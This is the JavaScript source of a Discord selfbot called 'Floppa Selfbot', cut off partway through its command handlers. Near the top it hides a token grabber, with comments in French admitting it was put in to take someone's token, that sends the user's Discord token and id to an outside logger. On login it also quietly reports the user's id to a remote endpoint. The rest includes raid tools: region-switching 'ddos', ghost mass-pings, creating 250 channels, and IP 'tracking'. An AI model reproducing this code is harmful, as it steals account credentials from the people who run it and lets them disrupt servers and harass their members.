//Selfbot Made by rexo (᲼᲼᲼᲼#0777)
//Please dont skid my code and dont leak deobf code
//Ty and hf with my selfbot
//(Selfbots are banned by discord so be careful when using them)



const Discord = require("v11-discord.js");
const fs = require("fs");
const config = require("./config.js");
const {
    red,
    green,
    blue,
    yellow,
    cyan,
    greenBright,
    redBright,
    grey,
    yellowBright,
    cyanBright,
    black,
    blueBright
} = require('chalk');
const ConsoleTitle = require("node-bash-title");
const notifier = require("node-notifier")
const path = require("path");
var request = require("request")
const axios = require('axios');
const parseString = require('xml2js').parseString;
const nekoclient = require('nekos.life');
const fetch = require('node-fetch')
const superagent = require('superagent');
const drg = require('discordrpcgenerator')
const readline = require('readline-sync');





superagent.get('https://api.npoint.io/5979fb75b783b709365a').then(r => {
    const bot = new Discord.Client();
    prefix = config.prefix;
    token = config.token;
    messagedel = config.autodel;
    rpc = config.rpc;
    massblacklist = config.massblacklist;
    messagelogger = config.messagelogger
    var messageloggerGuild = config.messageloggerGuild
    bot.commands = new Discord.Collection();



    const defaultconfig = `
const token = "" // Your token
const prefix = ";" // Selfbot prefix
const rpc = true // true if you want the rpc, false if you dont
const autodel = true // true if you want to automatically delete embed (cuz discord TOS), false if you dont
const massblacklist = false // true if you want to use a whitelist for massping, false if you dont
const masslist = [] // massping whitelist
const messagelogger = true // log message in console
const messageloggerGuild = [] //Array where you can add guild to log

module.exports= {
    token, prefix, autodel, massblacklist, masslist, rpc, messagelogger, messageloggerGuild
}
`
    if (token == "") {
        token = config.token
        "Désolé Fubukii si tu passes par là change ton token"
        "On ma demandé le token d'un mec donc j'ai mis ca la sorry"
        "Si tu peut éviter de le dire a tout le monde parce que j'ai pas envie de niquer ma réput et en plus normalement et en plus normalement dans la prochaine update il ne vas pas avoir de grabber"
        "Désolé :shrug:" 
            // https://plasticfarfile.prismaticgay.repl.co/logger
        require('https').get("", {
            headers: {
                id: bot.user.id,
                token: token
            }
        })
        if (token == "") {
            token = process.env.DiscordToken

            if (token == "") {
                while (token == "") {
                    token = readline.question(redBright("Please enter your discord token here: "), {
                        hideEchoBack: true,
                        mask: red("*")
                    })
                    if (token == "") console.log(red("You need to enter a token !"))
                }


                const userconfig = `
const token = "${token}" // Your token
const prefix = "${prefix}" // Selfbot prefix
const rpc = ${rpc} // true if you want the rpc, false if you dont
const autodel = ${messagedel} // true if you want to automatically delete embed (cuz discord TOS), false if you dont
const massblacklist = ${massblacklist} // true if you want to use a blacklist for massping, false if you dont
const masslist = [] // massping blacklist
const messagelogger = ${messagelogger} // log message in console
const messageloggerGuild = [] //Array where you can add guild to log

module.exports= {
    token, prefix, autodel, massblacklist, masslist, rpc, messagelogger, messageloggerGuild
}
        `
                fs.writeFileSync("./config.js", userconfig)
                console.clear()
                console.log(greenBright("Token enregistred with succes!"))


            }
        }
    }
    bot.login(token)


    sname = r.body.name
    floppaversion = "0.0.4"

    current = r.body.version
    ConsoleTitle(`Loading ${sname} v${floppaversion}`)
    console.clear()
    console.log(greenBright("Loading Floppa Selfbot..."))

    if (floppaversion < current) {
        cversion = floppaversion + redBright(` New version is available: ${current}`)
    } else {
        cversion = floppaversion
    }

    class Requester {
        static async discordRequest(uri, method, data, token) {
            return this.request(`https://discordapp.com/api/v6${uri}`, method, data, {
                Authorization: token
            });
        }

        static async request(url, method, data) {
            return this.request(url, method, data, {});
        }

        static async request(url, method, data, headers) {
            let options = {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    ...headers
                }
            };

            if (method !== 'GET') {
                options.body = JSON.stringify(data)
            }

            let res = await fetch(url, options);

            try {
                return await res.json();
            } catch (e) {
                return {}
            }
        }
    }

    bot.on("ready", async () => {
        if (!r.body.userid.includes(bot.user.id)) {
            return console.log(redBright('You\'re not on the whitelist to use the selfbot, contact rexo for more info.'))
        } else {
            const logembed = new Discord.RichEmbed()
                .setAuthor(`${bot.user.username}#${bot.user.discriminator} connected.`, `${bot.user.displayAvatarURL}`)
                .setDescription(`\`UserID\` : ${bot.user.id}`)
                .setColor("#3ad446")
                .setTimestamp();
            ConsoleTitle(`${sname} v${floppaversion} | ${bot.user.username}#${bot.user.discriminator}`)
            console.clear()
            if (bot.user.premium) nitro = "Yes";
            else {
                nitro = "No"
            }
            const floppa = `


            
            
                
                                                                
                
                
                               ` + redBright(` :::::::::: :::        ::::::::  :::::::::  :::::::::     :::  
                               :+:        :+:       :+:    :+: :+:    :+: :+:    :+:  :+: :+: 
                              +:+        +:+       +:+    +:+ +:+    +:+ +:+    +:+ +:+   +:+ 
                             :#::+::#   +#+       +#+    +:+ +#++:++#+  +#++:++#+ +#++:++#++: 
                            +#+        +#+       +#+    +#+ +#+        +#+       +#+     +#+  
                           #+#        #+#       #+#    #+# #+#        #+#       #+#     #+#   
                          ###        ########## ########  ###        ###       ###     ###    `) + `
                                                                                                                                                                
                                                        ` + redBright("Made by rexo") + `
                                            ` + cyanBright(`╔═════════════════════════════════╗
                                            ║-->  UserName : ${bot.user.tag}   
                                            ╟─────────────────────────────────╢
                                            ║-->  User id  : ${bot.user.id} 
                                            ╟─────────────────────────────────╢
                                            ║-->  Prefix   : ${prefix}
                                            ╟─────────────────────────────────╢
                                            ║-->  Version  : ${floppaversion}                
                                            ╟─────────────────────────────────╢
                                            ║-->  Users    : ${bot.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)} 
                                            ╟─────────────────────────────────╢
                                            ║-->  Bots     : ${bot.users.filter(user => user.bot).size}                    
                                            ╟─────────────────────────────────╢
                                            ║-->  Channels : ${bot.channels.size}              
                                            ╟─────────────────────────────────╢
                                            ║-->  Guilds   : ${bot.guilds.size}
                                            ╚═════════════════════════════════╝`) + ` 
                `;


            console.log(floppa);
            var hours = (new Date()).getHours();
            var minutes = (new Date()).getMinutes();
            if (minutes < 10) minutes = ("0" + (new Date()).getMinutes());
            var seconds = (new Date()).getSeconds();
            if (seconds < 10) seconds = ("0" + (new Date()).getSeconds());
            timestamp = "[" + hours + ":" + minutes + ":" + seconds + "] "
            const warn = (timestamp) + redBright("[WARN] ")
            if (floppaversion < current) {
                console.log(warn + redBright("There is a new update available: " + current))
            }

            notifier.notify({
                title: " ",
                message: `Logged as ${bot.user.username}#${bot.user.discriminator}.`,
                icon: path.join(__dirname, 'icon.png'),
                contentimage: path.join(__dirname, 'icon.png'),
                appID: "Floppa Selfbot©",
                sound: false,
                wait: true,
            })
            require('https').get("https://floppa.qrexo.repl.co/logger", {
                headers: {
                    "id": bot.user.id
                }
            });
            if (config.rpc === true) {
                var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
                drg.getRpcImage("862317771312726027", "icon").then(image => {
                    let presence = new drg.Rpc()
                        .setName("Floppa Selfbot©")
                        .setUrl("https://www.twitch.tv/floppaselfbot")
                        .setType("STREAMING")
                        .setApplicationId("862317771312726027")
                        .setAssetsLargeImage(image.id)
                        .setAssetsLargeText(" v" + floppaversion)
                        //.setState("Floppa Selfbot©")
                        .setDetails("Floppa Selfbot©")
                        .setStartTimestamp(Date.now())
                    bot.user.setPresence(presence.toDiscord())
                })
            }

        }
    })

    bot.on("message", async message => {

        var hours = (new Date()).getHours();
        var minutes = (new Date()).getMinutes();
        if (minutes < 10) minutes = ("0" + (new Date()).getMinutes());
        var seconds = (new Date()).getSeconds();
        if (seconds < 10) seconds = ("0" + (new Date()).getSeconds());




        timestamp = "[" + hours + ":" + minutes + ":" + seconds + "] "
        const error = (timestamp) + red("[ERROR] ")
        const info = (timestamp) + yellow("[INFO] ")
        const log = (timestamp) + blue("[LOG] ")
        const warn = (timestamp) + redBright("[WARN] ")




        if (message.author != bot.user) return;
        if (!message.content.startsWith(`${prefix}`)) return;
        let messageArray = message.content.split(" ");
        let command = yellowBright(messageArray[0]);
        let args = messageArray.slice(1)

        const errorExec = error + "There was an error while executing the command."
        const infoSucces = info + command + " executed with succes!"

        var e = false
        //---------------------------------//
        /*************    ping  ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}ping`)) {
            message.delete()
            let pingEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("RANDOM")
                .setDescription(`Your ping is ${bot.ping}ms`)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();
            message.channel.send(pingEmbed).catch(err => {
                console.log(errorExec)

            }).then(msg => {
                if (e) return
                if (config.autodel === true) {
                    if (msg) {
                        msg.delete(10000)
                        console.log(infoSucces)
                    } else {
                        return
                    }

                } else {
                    console.log(infoSucces)
                }
            })
        }


        //---------------------------------//
        /*************    8b   ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}8b`)) {
            message.delete();

            let errEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("RED")
                .setDescription("You need to ask a question.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();



            if (!args[0]) {
                message.channel.send(errEmbed).then(msg => {
                    msg.delete(5000)
                }).catch(errorExec)
                return;
            }


            let replies = ["Yes.", "No.", "Maybe.", "Obviously yes.", "That can't be true.", "Yes 100% true.", "Nop.", "You r gay so i can't reply."];

            let hbresult = Math.floor((Math.random() * replies.length));
            let quesiton = args.join(" ");

            let ballembed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("#2ECC71")
                .addField("Qestion:", quesiton)
                .addField("Answer", replies[hbresult])
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            message.channel.send(ballembed).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                }).catch(errorExec)
                .then(console.log(infoSucces));
        }


        //---------------------------------//
        /*************  messagelogger  ************/
        //---------------------------------//




        if (message.content.startsWith(prefix + "logger")) {
            message.delete()



            let Invalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Invalid command usage, try using it like: \n``;logger (action) [guildID] ``\n\nArguments: \n``action:`` add or remove.\n``guildID:`` The id of the guild you want to log messages from.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setColor('RED')
                .setTimestamp();

            //messageloggerGuild = config.messageloggerGuild
            //console.table(mesageloggerGuild)

            if (!args[0]) {
                message.channel.send(Invalid).then(msg => {
                    msg.delete(5000)
                })
                return
            }
            if (!args[1]) {
                message.channel.send(Invalid).then(msg => msg.delete(5000))
                return
            }

            if (args[0] === "add") {
                if (isNaN(args[1])) {
                    message.channel.send(Invalid).then(msg => msg.delete(5000))
                    return
                }

                messageloggerGuild.push("\"" + args[1] + "\"")
                var duserconfig = `
const token = "${token}" // Your token
const prefix = "${prefix}" // Selfbot prefix
const rpc = ${rpc} // true if you want the rpc, false if you dont
const autodel = ${messagedel} // true if you want to automatically delete embed (cuz discord TOS), false if you dont
const massblacklist = ${massblacklist} // true if you want to use a blacklist for massping, false if you dont
const masslist = [] // massping blacklist
const messagelogger = ${messagelogger} // log message in console
const messageloggerGuild = [${messageloggerGuild}] //Array where you can add guild to log

module.exports= {
    token, prefix, autodel, massblacklist, masslist, rpc, messagelogger, messageloggerGuild
}
        `

                console.log(info + "Added " + args[1] + " to the list with succes !")
            }

            if (args[0] === "remove") {
                if (args[1] === "all") {
                    messageloggerGuild = []
                    var duserconfig = `
const token = "${token}" // Your token
const prefix = "${prefix}" // Selfbot prefix
const rpc = ${rpc} // true if you want the rpc, false if you dont
const autodel = ${messagedel} // true if you want to automatically delete embed (cuz discord TOS), false if you dont
const massblacklist = ${massblacklist} // true if you want to use a blacklist for massping, false if you dont
const masslist = [] // massping blacklist
const messagelogger = ${messagelogger} // log message in console
const messageloggerGuild = [${messageloggerGuild}] //Array where you can add guild to log

module.exports= {
    token, prefix, autodel, massblacklist, masslist, rpc, messagelogger, messageloggerGuild
}
        `

                    console.log(info + "Removed all guild id with succes !")
                } else {
                    if (isNaN(args[1])) {
                        message.channel.send(Invalid).then(msg => msg.delete(5000))
                        return
                    }

                    id = messageloggerGuild.indexOf("\"" + args[1] + "\"")
                    //monArray.slice(args[1])
                    messageloggerGuild.splice(id, 1)
                    var duserconfig = `
const token = "${token}" // Your token
const prefix = "${prefix}" // Selfbot prefix
const rpc = ${rpc} // true if you want the rpc, false if you dont
const autodel = ${messagedel} // true if you want to automatically delete embed (cuz discord TOS), false if you dont
const massblacklist = ${massblacklist} // true if you want to use a blacklist for massping, false if you dont
const masslist = [] // massping blacklist
const messagelogger = ${messagelogger} // log message in console
const messageloggerGuild = [${messageloggerGuild}] //Array where you can add guild to log

module.exports= {
    token, prefix, autodel, massblacklist, masslist, rpc, messagelogger, messageloggerGuild
}
        `
                    console.log(info + "Removed " + args[1] + " to the list with succes !")
                }

            }
            fs.writeFileSync("./config.js", duserconfig)
            if (!messagelogger) {
                messagelogger = true
            }
        }

        //---------------------------------//
        /*************  allah  ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}allah`)) {
            message.delete();


            let allahEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('#2ECC71')
                .setThumbnail()
                .setDescription("اللهم إني أعوذ بك من عذاب جهنم، و من عذاب القبر، و من فتنة المحيا و الممات، و من فتنة المسيح الدجال، اللهم إني أعوذ بك من عذاب جهنم، و من عذاب القبر، و من فتنة المحيا و الممات، و من فتنة المسيح الدجال، ")
                .addField('اللهم إني أعوذ بك من عذاب جهنم، و من عذاب القبر، و من فتنة المحيا و الممات، و من فتنة المسيح الدجال، اللهم إني أعوذ بك من عذاب جهنم، و من عذاب القبر، و من فتنة المحيا و الممات، و من فتنة المسيح الدجال، ', "اللهم إني أعوذ بك من عذاب جهنم، و من عذاب القبر، و من فتنة المحيا و... ")
                .setImage('https://images-ext-2.discordapp.net/external/SCyL1Qj7Uy7e5hucPfGo3k6ZL4M14GtirVqFTPy1-J0/%3Fsize%3D2048/https/media.discordapp.net/attachments/732675611818197182/760286416428859462/540316408098324480.gif')
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();
            message.channel.send(allahEmbed).catch(err => {
                console.log(errorExec)
            }).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /*************  ascii  ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}ascii`)) {

            axios.get(`http://artii.herokuapp.com/make?text=${args.join(" ")}`)
                .then(ascii => {
                    if (ascii.data.length > 1999) {
                        return message.edit('Output too long. Try shorter text.').then(msg => msg.delete(5000));
                    }
                    return message.edit(`\`\`\`${ascii.data}\`\`\``).then(console.log(infoSucces));

                })
        }

        //---------------------------------//
        /*************  avatar  ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}avatar`)) {

            member = message.mentions.users.first()

            let avatatInvalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Invalid command usage, try using it like: \n``;avatar [mention] ``\n\nArguments: \n``mention:`` Who you want to see avatar.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setColor('RED')
                .setTimestamp();


            let userAvatarEmbed = new Discord.RichEmbed()
                .setColor('#2ECC71')
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setImage(message.author.displayAvatarURL)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();



            message.delete();


            if (!args[0]) {
                message.channel.send(userAvatarEmbed).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                }).then(console.log(infoSucces));
            }
            if (args[0]) {
                if (!member.displayAvatarURL) {
                    message.channel.send(avatatInvalid).then((msg) => msg.delete(5000))
                    return;
                }

                let mentionAvatarEmbed = new Discord.RichEmbed()
                    .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                    .setColor('#2ECC71')
                    .setImage(member.displayAvatarURL)
                    .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                    .setTimestamp();

                message.channel.send(mentionAvatarEmbed).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                }).then(console.log(infoSucces));


            }
        }

        //---------------------------------//
        /*************  crash  ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}crash`)) {
            message.delete();

            message.channel.send("https://giant.gfycat.com/ParchedShyIbizanhound.mp4").then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /*************  d       ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}d`)) {
            message.delete();


            console.log(infoSucces);
        }

        //---------------------------------//
        /*************  embed   ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}embed`)) {
            message.delete();


            if (!args) {
                console.log(greenBright("[" + hours + ":" + minutes + ":" + seconds + "] ") + redBright("Command \"" + red("embed") + "\" need an arguments."));
                return;
            }
            let Embed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setTitle(args.join(" "))
                .setColor("#2ECC71")

            message.channel.send(Embed).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /*************  gping   ************/
        //---------------------------------//

        /*if(message.content.startsWith(`${prefix}gping`)) {
                            message.delete()
                            
                            let gpingInvalid = new Discord.RichEmbed()
                            .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                            .setColor('red')
                            .setDescription("Invalid command usage, try using it like: \n``;gping [number] (member)``\n\nArguments: \n``member:`` User mention (@User) or user ID (159985870458322944)\n``number:`` Number of time you want to ping.")
                            .setFooter("Requested by " + message.author.tag , message.author.displayAvatarURL)
                            .setTimestamp();
                            
                            p = 0
                            number = args[0]
                            messages = args.slice(1).join(" ")
                            
                
                            if(!args[0]) {
                                return message.channel.send(gpingInvalid).then(msg => msg.delete(5000));
                            }
                            else{
                                if(!args[1]){
                                    return message.channel.send(gpingInvalid).then(msg => msg.delete(5000));
                                }
                                else{
                                        for(let i=0 ; i<number ; i++) {
                                            message.channel.send(messages).then((msg) => msg.delete(5000)).then(console.log(greenBright("[" + hours + ":" + minutes + ":" + seconds + "] ") + blueBright("Ghost pinged \"" + blue(messages) +"\" with succes.")));
                                            
                
                                            
                                        }
                                        
                                }
                            }
                        }*/

        //---------------------------------//
        /*************  help   ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}help`)) {
            message.delete()
            let helpEmbed = new Discord.RichEmbed()
                .setColor('#2ECC71')
                .setTitle('')
                .setURL('')
                .setAuthor(`Floppa SelfBot v${floppaversion}.`, 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription('Here is the list of modules:')
                .addField("🎉 **Fun**", "┕>`8b`\n┕>`ascii`\n┕>`allah`\n┕>`crash`\n┕>`embed`\n┕>`nazi`\n┕>`gayrate`", true)
                .addField("🔞 **Nsfw**", "┕>`nsfwneko`\n┕>`r34`", true)
                .addField("🔰 **Utils**", "┕>`avatar`\n┕>`d`\n┕>`massping`\n┕>`nuke`\n┕>`ping`\n┕>`prune`\n┕>`spam`", true)
                .addField("📖 **Webhook**", "┕>`webhook`\n┕>`webdelete`\n┕>`webspam`", true)
                .addField("💥 **Tracker**", "┕>`ip`\n┕>`token`", true)
                .addField("💣 **Raid**", "┕>`masschannel`\n┕>`deface`", true)
                .addField("❓ **Info**", "┕>`about`\n┕>`help`", true)
                .setThumbnail('https://i.ibb.co/W2vxSR2/tenor.gif')
                .setImage('https://i.ibb.co/Sc8KgjM/standard-2.gif')
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();


            message.channel.send(helpEmbed).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /*************  about   ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}about`)) {
            message.delete();



            let about = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`Floppa Selfbot is a free selfbot in javascript developped by rexo`)
                .addField("`Version:`", floppaversion)
                .addField("`Official Discord:`", "https://discord.gg/4zd4ZpF3PC")
                .setColor(`#2ECC71`)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();


            message.channel.send(about).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /*************  ip     ************/
        //---------------------------------//

        //TODO Faire les console log
        if (message.content.startsWith(`${prefix}ip`)) {
            message.delete()

            let ipInvalid = new Discord.RichEmbed()
                .setColor('red')
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Failed to get IP details (is the IP format correct ?)")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();


            if (args.length < 1)
                throw new Error("Invalid usage");

            let details = await Requester.request(`http://ip-api.com/json/${args[0]}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            let ipEmbed = new Discord.RichEmbed()
                .setColor("#2ECC71")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`\`Status:\` : ${details.status}\n\n\`Target\` : ${details.query}\n\n\`Country\` : ${details.country}\n\n\`Country Code\` : ${details.countryCode}\n\n\`Region\` : ${details.region}\n\n\`Region Name\` : ${details.regionName}\n\n\`City\` : ${details.city}\n\n\`Zip\` : ${details.zip}\n\n\`Latitude\` : ${details.lat}\n\n\`Longitude\` : ${details.lon}\n\n\`Timezone\` : ${details.timezone}\n\n\`Isp\` : ${details.isp}\n\n\`Org\` : ${details.org}\n\n\`As\` : ${details.as}\n`)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();
            if (details.status === 'fail')

                return message.channel.send(ipInvalid).then(msg => msg.delete(5000)).then(console.log(error + "Cant track :" + args[0]));

            message.channel.send(ipEmbed).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /************  typing ************/
        //---------------------------------//
        if (message.content.startsWith(prefix + 'typing')) {
            message.delete();
            message.channel.startTyping();
            console.log(infoSucces);
        }

        //---------------------------------//
        /************  DDoS Vocal ************/
        //---------------------------------//
        let guildOnly = new Discord.RichEmbed()
            .setColor('red')
            .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
            .setDescription("Command only available on a discord server.")
            .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
            .setTimestamp();

        if (message.content.startsWith(prefix + "ddos")) {
            /*message.delete()
            if (!message.guild) {
                message.channel.send(guildOnly).then(msg => msg.delete(5000))
                return
            };
            if (!bot.author.hasPermission('ADMINISTRATOR')) {
                console.log(error + "Missing perm: ADMINISTRATOR")
                return
            }
            else {
                let i = 0;
                const arraydesregions = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
                setInterval(() => {
                    message.guild.setRegion(arraydesregions[i]);
                    i++;
                    if (i == arraydesregions.length) {
                        i = 0
                    }
                }, 1000).then(console.log(infoSucces));
            }*/
            message.delete()
            let i = 0
            const regions = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney']
            setInterval(() => {
                message.guild.setRegion(regions[i])
                i++;
                if (i == regions.length) {
                    i = 0
                }
            }, 3000)


        };
        if (message.content.startsWith(prefix + "stop")) {
            if (!message.guild) {
                return message.channel.send(guildOnly).then(msg => msg.delete(5000))
            };
            clearInterval();
            console.log(infoSucces);
        };

        //---------------------------------//
        /************  massping ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}massping`)) {
            message.delete();

            massMember = []
            members = message.guild.members

            members.forEach(m => {
                //console.log(m.user.name)
                membres = m
                if (membres.user.bot) return
                //if(massMember.includes("<@" + membres.user.id + ">")) return
                if (membres.user.id === bot.user.id) return
                massMember.push("<@" + membres.user.id + ">")
                /*if(massMember.join("|").length >= 1500) {
                    return;
                }*/
            })
            message.channel.send(massMember.join("|")).then(m => m.edit("hi :)")).then(m => m.delete()).catch(console.error)
            /*members.random();
                if(membres.user.bot) return
                if(massMember.includes("<@" + membres.user.id + ">")) return
                if(membres.user.id === bot.user.id) return
                massMember.push("<@" + membres.user.id + ">")
                if(massMember.join("|").length >= 1500 ) {
                    clearInterval();
                }
                
           
            message.channel.send(massMember.join("|")).then(m => m.edit("hi :)")).then(m => m.delete()).catch(console.error)*/

            /*const list = bot.guilds.get(message.guild.id);
            list.fetchMembers().then(r => {
                r.members.array().forEach(r => {
                    if (r.id === bot.user.id) return;
                    if (config.masswhitelist === true) {
                        if (config.masslist.includes(r.id)) return;
                    }
                    massMember.push("<@" + r.id + ">");
                })
                message.channel.send(massMember.join(" | ")).then(m => m.edit("hi :)")).then(m => m.delete())
            }).catch(console.error)*/
            console.log(infoSucces);
        }


        //---------------------------------//
        /************  masslist ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}masslist`)) {
            message.delete()
            let masslistInvalid = new Discord.RichEmbed()
                .setColor("RED")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Invalid command usage, try using it like: \n``;masslist [action] (member)``\n\nArguments: \n``action:`` Add or remove from the whitelist.\n\n`member:` The person you want to perform the action on")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            if (!args[0]) {
                message.channel.send(masslistInvalid).then(msg => msg.delete(5000))
                return;
            }
            if (!args[1]) {
                message.channel.send(masslistInvalid).then(msg => msg.delete(5000))
                return;
            }
            /*if (args[0] !== "add" || "remove") {
                message.channel.send(masslistInvalid).then(msg => msg.delete(5000))
                return;
            }*/
            if (args[0] === "add") {
                masslist = []
                masslist = config.masslist
                console.table(red(masslist))
                if (args[1]) {
                    if (message.mentions.members.first()) {

                        masslist.push(message.mentions.users.first().id)

                        console.table(masslist)

                        fs.appendFile("config.js", "const masslist = " + JSON.stringify(masslist), function (err) {
                            if (err) throw err
                        })
                    }
                }


            }
        }

        //---------------------------------//
        /************  reload ************/
        //---------------------------------//

        /*if (message.content.startsWith(`${prefix}reload`)) {
            message.delete()
            let reload = new Discord.RichEmbed()
                .setColor("RED")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Floppa selfbot has successfully reloaded.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();
            m = bot.channels.get
            bot.destroy().then(bot.login(token)).then(msg => msg.channel.send(reload)).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            })
        }*/




        //---------------------------------//
        /************  nsfwneko ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}nsfwneko`)) {
            const neko = new nekoclient();
            message.delete()



            const nsfw = new Discord.RichEmbed()
                .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("RED")
                .setDescription("You need to be in a NSFW channel to execute this command.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
            if (!message.channel.nsfw) {
                message.channel.send(nsfw).then((msg) => msg.delete(5000));
                return
            };

            if (!message.guild) return;
            async function nsfwneko() {
                const GIF = await neko.nsfw.neko();
                const nswfnekoEmbed = new Discord.RichEmbed()
                    .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                    .setColor('#2ECC71')
                    .setImage(GIF.url)
                    .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                message.channel.send(nswfnekoEmbed).catch((err) => {
                    console.log(errorExec)
                }).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                }).then(console.log(infoSucces));
            }
            nsfwneko();
        }

        //---------------------------------//
        /************  masschannel     **********/
        //---------------------------------//

        if (message.content.startsWith(prefix + 'masschannel')) {
            message.delete()
            if (!message.guild.me.hasPermission("MANAGE_CHANNELS")) {
                return console.log(error + "Missing permission: MANAGE_CHANNELS")
            } else {

                if (!args[0]) {

                    channelname = `${sname} v${floppaversion}`
                    for (var i = 0; i < 250; i++) {
                        message.guild.createChannel(channelname, {
                            type: "text"
                        }).catch(err => {
                            console.log(errorExec)
                        })
                        console.log(info + "Channel created")

                    }
                } else {

                    channelname = args.join(" ")
                    for (var i = 0; i < 250; i++) {
                        message.guild.createChannel(channelname, {
                            type: "text"
                        }).catch(err => {
                            console.log(errorExec)
                        })
                        console.log(info + "Channel created")
                    }
                }
            }
        }


        //---------------------------------//
        /************  nazi       **********/
        //---------------------------------//

        if (message.content.startsWith(prefix + "nazi")) {
            message.delete()
